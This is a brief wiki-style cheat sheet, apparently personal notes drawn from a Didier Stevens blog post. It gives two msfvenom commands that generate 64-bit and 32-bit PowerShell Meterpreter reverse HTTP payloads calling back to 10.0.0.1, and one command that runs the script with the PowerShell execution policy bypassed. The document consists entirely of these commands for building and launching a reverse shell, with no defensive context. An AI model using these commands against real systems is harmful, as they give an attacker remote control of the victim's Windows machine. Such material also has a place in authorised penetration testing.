<!-- TITLE: Metasploit Powershell Payload -->
<!-- SUBTITLE: A quick summary of Metasploit Powershell Payload -->

# Header
Grabbed from https://blog.didierstevens.com/2017/08/16/generating-powershell-scripts-with-msfvenom-on-windows/

```
msfvenom –p windows/x64/meterpreter_reverse_http –format psh –out meterpreter-64.ps1 LHOST=10.0.0.1
msfvenom –p windows/meterpreter_reverse_http –format psh –out meterpreter-32.ps1 LHOST=10.0.0.1
```

# To Run
```
powershell.exe -ExecutionPolicy Bypass -NoExit -File meterpreter-64.ps1
```
